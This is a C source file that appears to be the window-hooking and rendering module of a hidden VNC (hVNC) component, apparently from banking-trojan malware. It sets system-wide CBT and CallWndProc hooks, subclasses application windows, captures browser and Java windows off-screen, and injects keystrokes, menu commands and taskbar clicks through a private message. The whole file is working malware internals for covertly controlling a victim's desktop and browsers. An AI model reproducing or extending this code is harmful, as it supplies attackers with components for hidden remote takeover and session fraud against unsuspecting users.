#define INITGUID

#include "vncmain.h"
#include <CommCtrl.h>
#include <Uxtheme.h>
#include <Shlobj.h>

#include "vncwnd.h"
#include "vncsrv.h"
#include "wndhook.h"
#include "namespc.h"

#include "vnc\mouse.h"
#include "vnc\wnd_watcher.h"
#include "vnc\browser.h"

#pragma warning(disable:4244)

#define GET_X_LPARAM(lp) ((int)(short)LOWORD(lp))
#define GET_Y_LPARAM(lp) ((int)(short)HIWORD(lp))

HBRUSH hBkgBrush = NULL;

CRITICAL_SECTION csTransMsgWnds;
WNDS_LIST_ITEM *lpWnds=NULL;

JavaPaintHook JavaHooks={0};
LOCKED_LIST(g_SubclassList);
LOCKED_LIST(g_HookList);

//////////////////////////////////////////////////////////////////////////
// Windows hook functions
LRESULT CALLBACK VncSrvWndSubclassProc(
	PCALL_HOOK pHook,
	HWND hwnd,
	UINT uMsg,
	WPARAM wParam,
	LPARAM lParam
	)
{
	WNDPROC OriginalFn = (WNDPROC)pHook->OriginalFn;
	PVNC_SESSION pSession = g_pSession;
	LRESULT lResult;

	if ( pHook->bDeleted )
	{
		DbgPrint("deleted window uMsg=%i\n",uMsg);
	}

	if ( !pHook->bReset )
	{
		pHook->bReset = TRUE;
		ResetClassStyle( pSession, hwnd );
	}

	if ( g_VncSharedSection.Data )
	{
		if (uMsg == g_VncSharedSection.Data->dwVNCMessage) {
			lResult = HandleVNCMsg(hwnd,wParam,lParam);
			if ( pHook->bIsDialog ){
				SetWindowLongPtr(hwnd, DWLP_MSGRESULT, lResult);
				lResult = TRUE;
			}
			return lResult;
		}
		else if ((g_bIsShell) && ((hwnd == pSession->Desktop.hDefView) || (hwnd == pSession->Desktop.hDeskListView)) && (uMsg == WM_ERASEBKGND)){ 
			lResult = EraseBkg(hwnd,wParam);
			if ( pHook->bIsDialog ){
				SetWindowLongPtr(hwnd, DWLP_MSGRESULT, lResult);
				lResult = TRUE;
			}
			return lResult;
		}
		else if ((uMsg == WM_NCACTIVATE) && (wParam) && !BR_IsIE() && !g_bIsShell){
			lResult = 0;
			if ( pHook->bIsDialog ){
				SetWindowLongPtr(hwnd, DWLP_MSGRESULT, lResult);
				lResult = TRUE;
			}
			return lResult;
		} 
	}

	return CallWindowProc ( OriginalFn, hwnd, uMsg, wParam, lParam );
}

//////////////////////////////////////////////////////////////////////////
// dialog proc

BOOL 
	VncSrvIsWindowSubclassed( 
		HWND hWnd,
		BOOL bIsDialog
		)
{
	PLIST_ENTRY ListEntry;
	BOOL fbResult = FALSE;

	g_SubclassList_Lock();
	for ( ListEntry = g_SubclassListHead.Flink; ListEntry != &g_SubclassListHead; ListEntry = ListEntry->Flink )
	{
		PCALL_HOOK pHook = CONTAINING_RECORD(ListEntry,CALL_HOOK,Entry);
		if ( pHook->Context == hWnd ){
			fbResult = TRUE;
			break;
		}
	}
	g_SubclassList_Unlock();
	return fbResult;
}

BOOL VncSrvTestIQ( PVNC_SESSION pSession, HWND hWnd )
{
	BOOL Result;

	LONG_PTR dwStyle = GetClassLongPtr(hWnd,GCL_STYLE);
	if (dwStyle & (CS_PARENTDC/*|CS_OWNDC*/|CS_CLASSDC)){
		return FALSE;
	}

	if ( BR_IsIE() ){
		return FALSE;
	}

	Result = ( SendMessage ( hWnd, SS_GET_DATA(pSession)->dwVNCMessage, VMW_IQTEST, 0 ) == VMR_IQOK );
	return Result;
}

BOOL 
	VncSrvSubclassWindow( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		BOOL bIsDialog
		)
{
	WNDPROC OrigFunc;
	BOOL fbResult = TRUE;

	// we can't subclass IE windows because
	// there are some classes that subclass windows and uses returned original
	// func as a pointer that is wrong
	// subclass window can return index of original instead of pointer
	// especially if you subclass already subclassed window
	//if ( BR_IsIE() ){
	//	DWORD dwClassFlags = GetWindowClassFlags(&pSession->Desktop,hWnd);
	//	if ( (dwClassFlags & WCF_JAVA ) != WCF_JAVA ){
	//		return TRUE;
	//	}
	//}

	if ( ! ( pSession->Desktop.dwFlags & HVNC_NO_SUBCLASS ) )
	{
		if ( !VncSrvIsWindowSubclassed(hWnd,bIsDialog) && !VncSrvTestIQ(pSession,hWnd) )
		{
			OrigFunc = ( WNDPROC )(LONG_PTR)GetWindowLongPtr( hWnd, bIsDialog ? DWLP_DLGPROC : GWLP_WNDPROC );
			if ( OrigFunc ){
				PCALL_HOOK pHook = AllocateCallStub( VncSrvWndSubclassProc, OrigFunc );
				if ( pHook ){
					pHook->Context = hWnd;
					pHook->bIsDialog = bIsDialog;

					g_SubclassList_Lock();
					InsertHeadList(&g_SubclassListHead, &pHook->Entry);  // Last In First Out	;)
					g_SubclassList_Unlock();

					pHook->OriginalFn = 
						(PVOID)(LONG_PTR)SetWindowLongPtr( hWnd, bIsDialog ? DWLP_DLGPROC : GWLP_WNDPROC, ( LONG_PTR )(PVOID)pHook->StubFn );
					pHook->WndLong = ( WNDPROC )(LONG_PTR)GetWindowLongPtr( hWnd, bIsDialog ? DWLP_DLGPROC : GWLP_WNDPROC );
				}else{
					fbResult = FALSE;
				}
			}else{
				fbResult = FALSE;
			}
		}
	}
	return fbResult;
}

BOOL 
	VncSrvSubclassWindowA( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		LPCSTR szClassName
		)
{
	CHAR szClassNameLocal[ 10 ] = "/0";
	BOOL fbResult = TRUE;
	BOOL bIsDialog = FALSE;
	BOOL bClassValid = FALSE;

	if ( ((LONG_PTR)(szClassName)) <= 0xFFFF || szClassName == NULL ){
		if ( GetClassNameA( hWnd, szClassNameLocal, 10 ) )
		{
			szClassName = szClassNameLocal;
			bClassValid = TRUE;
		}
	}else{
		bClassValid = ((szClassName!=NULL) && !IsBadStringPtrA(szClassName,14));
	}

	if ( bClassValid ){
		bIsDialog = ( BOOL )( lstrcmpiA( "#32770", szClassName ) == 0 );
	}

	if ( !bIsDialog && bClassValid  )
	{
		if ( g_bIsShell )
		{
			if (lstrcmpiA( "MSTaskSwWClass", szClassName ) == 0 || 
				lstrcmpiA( "MSTaskSwWClass", szClassName ) == 0 || 
				lstrcmpiA( "TrayNotifyWnd", szClassName ) == 0 )
			{
				return TRUE; // do not subclass
			}
		}
	}
	return VncSrvSubclassWindow ( pSession, hWnd, bIsDialog );
}

BOOL 
	VncSrvSubclassWindowW( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		LPCWSTR szClassName
		)
{
	WCHAR szClassNameLocal[ 10 ] = L"/0";
	BOOL fbResult = TRUE;
	BOOL bIsDialog = FALSE;
	BOOL bClassValid = FALSE;

	if ( ((LONG_PTR)(szClassName)) <= 0xFFFF || szClassName == NULL ){
		if ( GetClassNameW( hWnd, szClassNameLocal, 10 ) )
		{
			szClassName = szClassNameLocal;
			bClassValid = TRUE;
		}
	}else{
		bClassValid = ((szClassName!=NULL) && !IsBadStringPtrW(szClassName,14));
	}

	if ( bClassValid ){
		bIsDialog = ( BOOL )( lstrcmpiW( L"#32770", szClassName ) == 0 );
	}
	if ( !bIsDialog && bClassValid )
	{
		if ( g_bIsShell ){
			if (lstrcmpiW( L"MSTaskSwWClass", szClassName ) == 0 || 
				lstrcmpiW( L"MSTaskSwWClass", szClassName ) == 0 || 
				lstrcmpiW( L"TrayNotifyWnd", szClassName ) == 0 )
			{
				return TRUE; // do not subclass
			}
		}
	}
	return VncSrvSubclassWindow ( pSession, hWnd, bIsDialog );
}

BOOL 
	VncSrvUnsubclassWindow( 
		PVNC_SESSION pSession, 
		HWND hWnd,
		BOOL ResetWndProc
		)
{
	BOOL fbResult = FALSE;

	PLIST_ENTRY ListEntry = NULL;
	PCALL_HOOK pHook = NULL;

	// remove hook
	g_SubclassList_Lock();
	for ( ListEntry = g_SubclassListHead.Flink; 
		ListEntry != &g_SubclassListHead; 
		ListEntry = ListEntry->Flink )
	{
		pHook = (PCALL_HOOK)ListEntry;
		if ( pHook->Context == hWnd )
		{
			RemoveEntryList(&pHook->Entry);
			fbResult = TRUE;
			break;
		}
		pHook = NULL;
	}
	g_SubclassList_Unlock();

	if ( pHook ){
		if ( ResetWndProc ){
			SetWindowLongPtr( hWnd, pHook->bIsDialog ? DWLP_DLGPROC : GWLP_WNDPROC, ( LONG_PTR )pHook->OriginalFn );
		}
		pHook->bDeleted = TRUE;
		hFree ( pHook );
	}

	return fbResult;
}

LRESULT CALLBACK VncSrvCallWndProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;

	if ( nCode == HC_ACTION && lParam )
	{
		PCWPSTRUCT pCWPSTRUCT = (PCWPSTRUCT)lParam;
		HWND hWnd = pCWPSTRUCT->hwnd;
		UINT uMsg = pCWPSTRUCT->message;
		CHAR szClassName[ 10 ] = "/0";
		PVNC_SESSION pSession = g_pSession;

		switch( uMsg )
		{
		case WM_CREATE:
			{
				LPCREATESTRUCT pCREATESTRUCT = (LPCREATESTRUCT)pCWPSTRUCT->lParam;
				BOOL fbSetLayered = FALSE;

				GetClassNameA( hWnd, szClassName, 10 );

				if (GetWindowClassFlagsEx(&pSession->Desktop,szClassName) & WCF_JAVA)
				{
					if ((pCREATESTRUCT->style & (WS_DLGFRAME|WS_OVERLAPPEDWINDOW|WS_POPUPWINDOW)) && 
						(!(pCREATESTRUCT->dwExStyle & WS_EX_LAYERED)))
					{
						pCREATESTRUCT->dwExStyle = 
							pCREATESTRUCT->dwExStyle | WS_EX_LAYERED & ~WS_EX_TRANSPARENT;
						fbSetLayered = TRUE;
					}
				}

				// call the next hook
				lResult = CallNextHookEx(NULL, nCode, wParam, lParam);
				if ( lResult == NO_ERROR ){
					ResetClassStyle( g_pSession, hWnd );
				}else{
					DbgPrint("CallNextHookEx returned %lu\n",lResult);
				}
				return lResult;
			}
			break;
		case WM_NCACTIVATE:
			if ( wParam  && !BR_IsIE() && !g_bIsShell )
			{
				GetClassNameA( hWnd, szClassName, 10 );
				lResult = 0;
				if ( IsDialogWindow(hWnd) ){
					SetWindowLongPtr(hWnd, DWLP_MSGRESULT, lResult);
					lResult = TRUE;
				}
				return lResult;
			} 
			break;
		case WM_ERASEBKGND:
			if ((g_bIsShell) && 
				((hWnd == pSession->Desktop.hDefView) || 
					(hWnd == pSession->Desktop.hDeskListView)))
			{ 
				lResult = EraseBkg(hWnd,wParam);
				if ( IsDialogWindow(hWnd) ){
					SetWindowLongPtr(hWnd, DWLP_MSGRESULT, lResult);
					lResult = TRUE;
				}
				return lResult;
			}
		case WM_PAINT:
			//if ( !g_bIsShell )
			//	DbgPrint("WM_PAINT\n");
			break;
		case WM_NCPAINT:
			//if ( !g_bIsShell )
			//	DbgPrint("WM_NCPAINT\n");
			break;
		}
		if (g_VncSharedSection.Data && uMsg == g_VncSharedSection.Data->dwVNCMessage) {
			lResult = HandleVNCMsg(hWnd,wParam,lParam);
			if ( IsDialogWindow(hWnd) ){
				SetWindowLongPtr(hWnd, DWLP_MSGRESULT, lResult);
				lResult = TRUE;
			}
			return lResult;
		}
	}
	return CallNextHookEx(NULL,nCode,wParam,lParam);
}

//The CBT hook Proc(Computer Based Training Hook)
LRESULT CALLBACK VncSrvWndProc(int nCode,WPARAM wParam,LPARAM lParam)
{
	LRESULT lResult;
	HWND hWnd = (HWND)wParam;

	if ( g_pSession )
	{
		switch (nCode )
		{
			case HCBT_CREATEWND:  //Called when the application window is activated
			{
				CBT_CREATEWND *pCBT = (CBT_CREATEWND *)lParam;
				CHAR szClassName[ 10 ] = "/0";
				BOOL fbSetLayered = FALSE;

				GetClassNameA( hWnd, szClassName, 10 );

				if (GetWindowClassFlagsEx(&g_pSession->Desktop,szClassName) & WCF_JAVA)
				{
					if ((pCBT->lpcs->style & (WS_DLGFRAME|WS_OVERLAPPEDWINDOW|WS_POPUPWINDOW)) && 
						(!(pCBT->lpcs->dwExStyle & WS_EX_LAYERED)))
					{
						pCBT->lpcs->dwExStyle = 
							pCBT->lpcs->dwExStyle | WS_EX_LAYERED & ~WS_EX_TRANSPARENT;
						fbSetLayered = TRUE;
					}
				}

				//if (pCBT->lpcs->style & (CS_PARENTDC|CS_OWNDC|CS_CLASSDC)){
				//	pCBT->lpcs->style &= ~CS_PARENTDC & ~CS_OWNDC & ~CS_CLASSDC;
				//}

				// call the next hook
				lResult = CallNextHookEx(NULL, nCode, wParam, lParam);
				if ( lResult == NO_ERROR ){
					ResetClassStyle( g_pSession, hWnd );
					VncSrvSubclassWindowA( g_pSession, hWnd, szClassName );
				}else{
					DbgPrint("CallNextHookEx returned %lu\n",lResult);
				}
				return lResult;
			}
			case HCBT_DESTROYWND:  //Called when the application window is destroyed
			{
				lResult = CallNextHookEx(NULL, nCode, wParam, lParam);
				// remove hook
				VncSrvUnsubclassWindow( g_pSession, hWnd, TRUE );
				return lResult;
			}
			break;
		}//switch
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}//End of the hook procedure

void ResetWndStyle(PVNC_SESSION pSession, HWND hWnd)
{
	if (GetWindowClassFlags(&pSession->Desktop,hWnd) & WCF_JAVA)
	{
		WINDOWINFO wiInfo;
		wiInfo.cbSize=sizeof(WINDOWINFO);
		GetWindowInfo(hWnd,&wiInfo);
		if ((wiInfo.dwStyle & (WS_DLGFRAME|WS_OVERLAPPEDWINDOW|WS_POPUPWINDOW)) &&  (!(wiInfo.dwExStyle & WS_EX_LAYERED)))
		{
			SetWindowLongPtr(hWnd,GWL_EXSTYLE,wiInfo.dwExStyle | WS_EX_LAYERED & ~WS_EX_TRANSPARENT);
			SetLayeredWindowAttributes(hWnd,0xFFFF,255,LWA_ALPHA);
		}
	}
	return;
}

BOOL CALLBACK ResetClassStyle(PVNC_SESSION pSession,HWND hWnd)
{
	LONG_PTR dwStyle;

	ResetWndStyle(pSession,hWnd);
	dwStyle=GetClassLongPtr(hWnd,GCL_STYLE);

	if (dwStyle & (CS_PARENTDC/*|CS_OWNDC*/|CS_CLASSDC)){
		SetClassLongPtr(hWnd,GCL_STYLE,dwStyle & ~CS_PARENTDC /*& ~CS_OWNDC*/ & ~CS_CLASSDC );
	}

	return TRUE;
}

void FixMessage ( BOOL r, LPMSG Msg )
{
	if ( g_VncSharedSection.Data && g_VncSharedSection.Data->dwVNCMessage )
	{
		if (r > 0)
		{
			Msg->pt.x = g_VncSharedSection.Data->ptCursor.x;
			Msg->pt.y = g_VncSharedSection.Data->ptCursor.y;
		}
		if (Msg->message == g_VncSharedSection.Data->dwVNCMessage){
			HandleVNCMsg(Msg->hwnd,Msg->wParam,Msg->lParam);
		}
	}

	return;
}

LRESULT EraseBkg(HWND hWnd,WPARAM wParam)
{
	RECT rect;
	GetClientRect(hWnd,&rect);
	FillRect((HDC)wParam,&rect,BmpGetBlackBrush());
	return 1;
}

void AppendWnd(HWND hWnd)
{
	EnterCriticalSection(&csTransMsgWnds);
	{
		PWNDS_LIST_ITEM lpWnd = lpWnds;
		if ( lpWnd )
		{
			while (lpWnd->lpNext) {
				lpWnd = lpWnd->lpNext;
			}
			lpWnd = lpWnd->lpNext = (PWNDS_LIST_ITEM)hAlloc(sizeof(WNDS_LIST_ITEM));
		}
		else{
			lpWnds = lpWnd = (PWNDS_LIST_ITEM)hAlloc(sizeof(WNDS_LIST_ITEM));
		}
		lpWnd->hWnd = hWnd;
		lpWnd->lpNext = NULL;
	}
	LeaveCriticalSection(&csTransMsgWnds);
	return;
}

BOOL IsTranslateMessageUsed(HWND hWnd)
{
	BOOL bRet=FALSE;
	EnterCriticalSection(&csTransMsgWnds);
	{
		PWNDS_LIST_ITEM lpWnd=lpWnds;
		while (lpWnd)
		{
			if (lpWnd->hWnd == hWnd)
			{
				bRet=TRUE;
				break;
			}
			lpWnd=lpWnd->lpNext;
		}
	}
	LeaveCriticalSection(&csTransMsgWnds);
	return bRet;
}

JavaPaintHook* AllocateJavaHook( HWND hWnd , HDC hDC, DWORD dwHeight, DWORD dwWidth, BOOL UpdateViewPort )
{
	JavaPaintHook *pjhd=&JavaHooks;
	pjhd = (JavaPaintHook*)hAlloc(sizeof(JavaPaintHook));
	if ( pjhd ){
		HBITMAP hBmp;
		pjhd->next = NULL;
		pjhd->hDC = CreateCompatibleDC( hDC );
		hBmp = CreateCompatibleBitmap( hDC, dwWidth, dwHeight );
		if ( hBmp ){
			pjhd->hBitmap=(HBITMAP)SelectObject(pjhd->hDC,(HGDIOBJ)hBmp);
		}
		pjhd->hMutex = CreateMutex(NULL,FALSE,NULL);
		pjhd->hWnd = hWnd;
		pjhd->UpdateViewPort = UpdateViewPort;
	}
	return pjhd;
}

JavaPaintHook* LookupJavaHook( HWND hWnd )
{
	JavaPaintHook *pjhd=&JavaHooks;

	while ((pjhd->next) && (pjhd->hWnd != hWnd))
		pjhd=pjhd->next;

	if (pjhd->hWnd != hWnd){
		pjhd = NULL;
	}
	return pjhd;
}

void HandleWM_PRINT(PVNC_SESSION pSession, HWND hWnd )
{
	WINDOWINFO wiInfo;
	HWND hParent;
	int ClientX,ClientY;
	DWORD_PTR Result;
	DWORD dwClassFlags = 0;

	if (!IsWindowEx(&pSession->Desktop,hWnd))
		return;

	wiInfo.cbSize=sizeof(WINDOWINFO);
	GetWindowInfo(hWnd,&wiInfo);
	hParent=GetParent(hWnd);

	dwClassFlags = GetWindowClassFlags(&pSession->Desktop,hWnd);

	ScrLockPainting( pSession );

	if ( dwClassFlags & (WCF_JAVA | WCF_OPERA) )
	{
		JavaPaintHook *pjhd=&JavaHooks;
		BOOL bJava = ((dwClassFlags & WCF_JAVA) == WCF_JAVA);
		ResetWndStyle(pSession,hWnd);

		while ((pjhd->next) && (pjhd->hWnd != hWnd))
			pjhd=pjhd->next;

		if (pjhd->hWnd != hWnd)
		{
			pjhd->next=
				AllocateJavaHook(
					hWnd,
					pSession->Desktop.hIntermedMemDC,
					SS_GET_DATA(pSession)->dwHeight,
					SS_GET_DATA(pSession)->dwWidth,
					bJava
					);
			pjhd = pjhd->next;
		}

		if ( pjhd )
		{
			RedrawWindow(hWnd,NULL,NULL,RDW_ERASE+RDW_INVALIDATE+RDW_FRAME+RDW_ALLCHILDREN);
			SendMessageTimeout(
				hWnd,WM_NCACTIVATE,TRUE,0,
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&Result
				);
			PrintWindow(hParent,pSession->Desktop.hIntermedMemDC,0);
			DefWindowProc(
				hWnd,
				WM_PRINT,
				(WPARAM)pSession->Desktop.hIntermedMemDC,
				PRF_CLIENT | PRF_NONCLIENT | PRF_CHILDREN | PRF_ERASEBKGND | PRF_OWNED
				);

			WaitForSingleObject(pjhd->hMutex,INFINITE);

			if ( bJava ){
				SetViewportOrgEx(pjhd->hDC,0,0,NULL);
			}

			if (wiInfo.rcWindow.left < 0){
				wiInfo.rcWindow.left=0;
			}
			if (wiInfo.rcWindow.top < 0){
				wiInfo.rcWindow.top=0;
			}
			ClientX=wiInfo.rcClient.left-wiInfo.rcWindow.left;
			ClientY=wiInfo.rcClient.top-wiInfo.rcWindow.top;
			BitBlt(
				pSession->Desktop.hIntermedMemDC,
				ClientX,ClientY,
				wiInfo.rcClient.right  - wiInfo.rcClient.left,
				wiInfo.rcClient.bottom - wiInfo.rcClient.top,
				pjhd->hDC,0,0,SRCCOPY
				);
			ReleaseMutex(pjhd->hMutex);
		}
	}
	else
	{
		POINT pt;
		if (GetClassLongPtr(hParent,GCL_STYLE) & (CS_CLASSDC|CS_PARENTDC))
		{
			DefWindowProc(
				hParent,
				WM_PRINT,
				(WPARAM)pSession->Desktop.hTmpIntermedMemDC,
				PRF_CLIENT|PRF_NONCLIENT|PRF_CHILDREN|PRF_ERASEBKGND|PRF_OWNED
				);
		}
		else{
			PrintWindow(hParent,pSession->Desktop.hTmpIntermedMemDC,0);
		}
		pt.x = wiInfo.rcWindow.left;
		pt.y = wiInfo.rcWindow.top;
		ScreenToClient(hParent,&pt);

		BitBlt(
			pSession->Desktop.hIntermedMemDC,0,0,
			wiInfo.rcClient.right  - wiInfo.rcClient.left,
			wiInfo.rcClient.bottom - wiInfo.rcClient.top,
			pSession->Desktop.hTmpIntermedMemDC,
			pt.x,pt.y,
			SRCCOPY
			);
		DefWindowProc(
			hWnd,
			WM_PRINT,
			(WPARAM)pSession->Desktop.hIntermedMemDC,
			PRF_CLIENT|PRF_NONCLIENT|PRF_CHILDREN|PRF_ERASEBKGND|PRF_OWNED
			);
	}

	BmpCopyScreenBuffer(pSession,&wiInfo.rcWindow,TRUE);
	ScrUnlockPainting( pSession );

	return;
}

LRESULT HandleVNCMsg(HWND hWnd,WPARAM wParam,LPARAM lParam)
{
	LRESULT lRes=0;
	int i;
	switch (wParam)
	{
	case VMW_EXECUTE_MENU:
	case VMW_HILITE_MENU:
		{
			int dwItem;
			HMENU hMenu = GetMenu(hWnd);

			if (hMenu)
			{
				int dwLastHiliteItem=-1,dwItemsCount=GetMenuItemCount(hMenu);
				for ( i=0; i<dwItemsCount; i++)
				{
					if (GetMenuState(hMenu,i,MF_BYPOSITION) & MF_HILITE)
					{
						HiliteMenuItem(hWnd,hMenu,i,MF_BYPOSITION+MF_UNHILITE);
						dwLastHiliteItem=i;
					}
				}

				dwItem = MenuItemFromPoint( hWnd, hMenu,g_VncSharedSection.Data->ptCursor);
				if (dwItem != -1)
				{
					DWORD dwItemState=GetMenuState(hMenu,dwItem,MF_BYPOSITION);
					if (dwLastHiliteItem != dwItem){
						EndMenu();
					}
					HiliteMenuItem(hWnd,hMenu,dwItem,MF_BYPOSITION+MF_HILITE);

					if ((wParam == VMW_HILITE_MENU) || (dwItemState & (MF_DISABLED+MF_GRAYED))){
						break;
					}

					if (dwItemState & MF_POPUP)
					{
						HMENU hPopupMenu=GetSubMenu(hMenu,dwItem);
						RECT rcItem;
						if ((hPopupMenu) && (GetMenuItemRect(hWnd,hMenu,dwItem,&rcItem))){
							TrackPopupMenuEx(
								hPopupMenu,
								TPM_LEFTALIGN+TPM_TOPALIGN+TPM_LEFTBUTTON+TPM_NOANIMATION+TPM_HORIZONTAL,
								rcItem.left,
								rcItem.bottom,
								hWnd,NULL
								);
						}
					}
					else
					{
						UINT dwID=(dwItemState & MF_SEPARATOR) ? 0:GetMenuItemID(hMenu,dwItem);
						if (dwID != (UINT)-1){
							DWORD_PTR Result;
							SendMessageTimeout(
								hWnd,WM_COMMAND,MAKEWPARAM(dwID,0),0,
								SMTO_ABORTIFHUNG | SMTO_NORMAL,
								WND_MSG_TIMEOUT,
								&Result
								);
						}
					}
				}
			}
			break;
		}
	case VMW_UPDATE_KEYSTATE:
		{
			//VncLockSharedSection( &g_VncSharedSection );
			{
				BOOL bCtrl,bAlt;
				SetKeyboardState(g_VncSharedSection.Data->KbdState);
				bCtrl=((g_VncSharedSection.Data->KbdState[VK_CONTROL] & 0x80) != 0);
				bAlt=((g_VncSharedSection.Data->KbdState[VK_MENU] & 0x80) != 0);

				if ( bAlt )
				{
					if ( !bCtrl )
					{
						if (g_VncSharedSection.Data->KbdState[VK_F4] & 0x80){
							PostMessage(GetAncestor(hWnd,GA_ROOT),WM_CLOSE,0,0);
						}
					}
					else if (g_VncSharedSection.Data->KbdState[VK_DELETE] & 0x80){
						ShellExecute(0,_T("open"),_T("taskmgr"),NULL,NULL,SW_SHOWNORMAL);
					}
				}
				else if (bCtrl)
				{
					if (!bAlt)
					{
						if (g_VncSharedSection.Data->KbdState[VK_ESCAPE] & 0x80){
							PostMessage(g_pSession->Desktop.hTrayWnd,WM_LBUTTONDOWN,0,0);
						}
					}
				}
			}
			//VncUnlockSharedSection( &g_VncSharedSection );
			break;
		}
	case VMW_PRINT_SCREEN:
		{
			if ( g_pSession->Desktop.hIntermedMemBitmap )
			{
				HandleWM_PRINT(g_pSession,hWnd);
				lRes = 0xDEAD;

				ResetClassStyle( g_pSession, hWnd );
			}
			break;
		}
	case VMW_CHANGELAYOUT:
		{
			if ( ActivateKeyboardLayout((HKL)lParam,0) == 0 )
			{
				DbgPrint("ActivateKeyboardLayout failed \n");
			}else{
				DbgPrint("ActivateKeyboardLayout succeed \n");
			}
			break;
		}
	case VMW_IQTEST:
		{
			lRes = VMR_IQOK;
			break;
		}
	case VMW_ERASEBKG:
		{
			RedrawWindow(g_pSession->Desktop.hDeskListView, NULL, NULL, RDW_INVALIDATE + RDW_ERASE );
			break;
		}
	case VMW_TBHITTEST:
		{
#ifndef TB_HITTEST
	#define TB_HITTEST              (WM_USER + 69)
#endif
			POINT pt={GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam)};
			SendMessageTimeout(
				hWnd,TB_HITTEST,(WPARAM)NULL,(LPARAM)&pt,
				SMTO_ABORTIFHUNG | SMTO_NORMAL,
				WND_MSG_TIMEOUT,
				&lRes
				);
			break;
		}
	case VMW_TBRCLICK:
	case VMW_TBLCLICK:
		{
			POINT pt={GET_X_LPARAM(lParam),GET_Y_LPARAM(lParam)};
			DWORD_PTR dwBtn = 0;
			if ( SendMessageTimeout(
					hWnd,TB_HITTEST,(WPARAM)NULL,(LPARAM)&pt,
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					WND_MSG_TIMEOUT,
					&dwBtn
				)  && 
				dwBtn)
			{
				TBBUTTON btn = { 0 };
				HWND hNewWnd;
				TCHAR szText[512];
				DWORD_PTR Result;

				SendMessageTimeout(
					hWnd,TB_GETBUTTON,dwBtn,(LPARAM)&btn,
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					WND_MSG_TIMEOUT,
					&Result
					);
				SendMessageTimeout(
					hWnd,TB_GETBUTTONTEXT,btn.idCommand,(LPARAM)szText,
					SMTO_ABORTIFHUNG | SMTO_NORMAL,
					WND_MSG_TIMEOUT,
					&Result
					);

				hNewWnd=FindWindow(NULL,szText);
				if (!(btn.fsState & TBSTATE_CHECKED)){
					SetForegroundWnd(g_pSession,hNewWnd);
				}
				if (wParam == VMW_TBRCLICK)
				{
					ClientToScreen(hWnd,&pt);
					PostMessage(hNewWnd,g_VncSharedSection.Data->dwVNCMessage,VMW_SHOWSYSMENU,MAKELPARAM(pt.x,pt.y));
				}
			}
			break;
		}
	case VMW_SHOWSYSMENU:
		{
			HMENU hMenu=GetSystemMenu(hWnd,FALSE);

			SendMessage(
				hWnd,
				WM_SYSCOMMAND,
				TrackPopupMenu(hMenu,TPM_RETURNCMD,GET_X_LPARAM(lParam),
					GET_Y_LPARAM(lParam),FALSE,hWnd,NULL),
				(WPARAM)NULL
				);
			break;
		}
	case VMW_ISTRANSMSGUSED:
		{
			if (IsTranslateMessageUsed(hWnd)){
				lRes=(LRESULT)hWnd;
			}
			break;
		}
	default:
		DbgPrint("unknown message %08X\n",wParam);
		break;
	}
	return lRes;
}

//////////////////////////////////////////////////////////////////////////
BOOL VncWndInitialize( PVNC_SESSION pSession )
{
	g_SubclassList_Init();
	g_HookList_Init();
	InitializeCriticalSection(&csTransMsgWnds);

	// init painting stuff
	BmpInitiPainting();

	return TRUE;
}

VOID VncWndRelease( PVNC_SESSION pSession )
{
	BOOL fbResult = FALSE;

	PLIST_ENTRY ListEntry = NULL;
	PCALL_HOOK pHook = NULL;

	// remove hook
	g_SubclassList_Lock();
	while ( IsListEmpty( &g_SubclassListHead ) == FALSE )
	{
		ListEntry = RemoveHeadList(&g_SubclassListHead);
		pHook = (PCALL_HOOK)ListEntry;

		g_SubclassList_Unlock();
		SetWindowLongPtr( (HWND)pHook->Context, pHook->bIsDialog ? DWLP_DLGPROC : GWLP_WNDPROC, ( LONG_PTR )pHook->OriginalFn );
		pHook->bDeleted = TRUE;
		hFree ( pHook );
		g_SubclassList_Lock();
	}
	g_SubclassList_Unlock();

	DeleteCriticalSection(&csTransMsgWnds);
}